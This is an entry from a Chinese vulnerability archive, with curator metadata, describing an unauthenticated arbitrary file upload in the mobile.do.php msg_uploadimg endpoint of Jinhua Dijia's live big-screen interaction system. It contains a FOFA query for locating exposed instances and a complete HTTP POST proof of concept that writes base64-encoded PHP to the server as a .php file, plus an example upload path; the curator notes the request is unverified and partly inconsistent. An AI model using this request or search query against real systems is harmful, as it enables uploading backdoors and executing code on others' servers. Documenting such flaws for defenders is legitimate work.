---
source: "wy876 漏洞文库"
title: "金华迪加现场大屏互动系统 mobile.do msg_uploadimg任意上传"
product: "金华迪加现场大屏互动系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，PHP可执行目录"
prerequisites: "请求含PHP会话但声称未认证"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ooo15ulb6mttxdqb"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%87%91%E5%8D%8E%E8%BF%AA%E5%8A%A0%E5%A4%A7%E5%B1%8F/%E9%87%91%E5%8D%8E%E8%BF%AA%E5%8A%A0%E7%BD%91%E7%BB%9C%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%8E%B0%E5%9C%BA%E5%A4%A7%E5%B1%8F%E4%BA%92%E5%8A%A8%E7%B3%BB%E7%BB%9Fmobile.do.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/wall/themes/meepo/assets/images/defaultbg.jpg\"||title=\"现场活动大屏幕系统\""
fofa_unverified: "body="
id: "vw-5586f1165f35da218a95d215"
entity_id: "ve-5586f1165f35da218a95d215"
schema_version: "1"
---

# 金华迪加现场大屏互动系统 mobile.do msg_uploadimg任意上传

## 条目说明

- 对象与具体问题：金华迪加现场大屏互动系统；mobile.do msg_uploadimg任意上传
- 版本、配置及部署条件：未知版本，PHP可执行目录
- 认证与权限前提：请求含PHP会话但声称未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 静态解码为md5(1)输出并自删除，未执行
- Content-Length20远短于body；固定历史pic数字路径需用响应提取
- 匿名声称需移除Cookie对照；重复三节编号，缺返回/补丁

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
金华迪加网络科技有限公司是一家民营企业，专注于开发和优化现场互动系统平台,其主要产品是现场活动大屏幕系统。这个系统被设计用于增强活动现场的互动性，提供技术支持给合作企业。金华迪加网络科技有限公司现场大屏互动系统mobile.do.php接口存在文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。

## 二、影响版本
+ 现场大屏互动系统

## 三、资产测绘
+ fofa`body="/wall/themes/meepo/assets/images/defaultbg.jpg"||title="现场活动大屏幕系统"`
+ 特征


## 三、漏洞复现
```http
POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Cookie: PHPSESSID=b8u1t0sl69oh62
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded

filetype=php&imgbase64=PD9waHAgZWNobyBtZDUoMSk7dW5saW5rKF9fRklMRV9fKTsgPz4=
```

> 请求长度说明：原资料 Content-Length 为 20；静态长度已移除，应由客户端根据最终请求体的字节数生成。


```plain
/data/pic/pic_173026980616947.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ooo15ulb6mttxdqb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
